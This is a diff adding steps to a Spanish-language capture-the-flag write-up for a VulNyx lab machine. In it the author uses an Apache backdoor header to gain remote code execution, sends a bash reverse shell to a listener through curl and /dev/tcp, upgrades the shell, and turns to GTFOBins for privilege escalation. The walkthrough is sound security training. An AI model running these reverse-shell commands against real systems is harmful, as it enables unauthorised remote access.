@@ -48,5 +48,36 @@ Vemos que hay un módulo bastante sospechoso llamado **backdoor** o **puerta tra
 
 ![captura-mod](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/ad38e771-b424-4636-a61b-b5c87c6a38c0)
 
-Podemos ejecutar comandos de manera remota **(RCE)**
+Podemos ejecutar comandos de manera remota **(RCE)**.
+
+![captura-whoami](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/b69bb677-5323-4a08-9ee0-4fb6bdbbce9a)
+
+Vemos que si podemos ejecutar. Por lo tanto lo que se me ocurre en estos momentos es hacer una **reverse shell**.
+
+`curl -sX GET -H "Backdoor: bash -c 'bash -i >& /dev/tcp/192.168.166.103/443 0>&1'" "http://192.168.166.104"`
+
+Pero antes nos ponemos en escucha.
+
+`nc -nlvp 443`
+
+Y ahora sí le damos.
+
+![captura-nc](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/76bd4bc4-2335-4419-9430-d0774dd7eb93)
+
+Volvemos la reverse shell útil y cómoda.
+
+`script /dev/null -c bash`
+
+`CTRL + Z`
+
+`stty raw -echo; fg`
+
+`reset xterm`
+
+`export TERM=xterm`
+
+`export BASH=bash`
+
+Podemos ejecutar **service** como **laurent**. Buscamos el binario en **[GTfobins](https://GTfobins.github.io)**
+
 
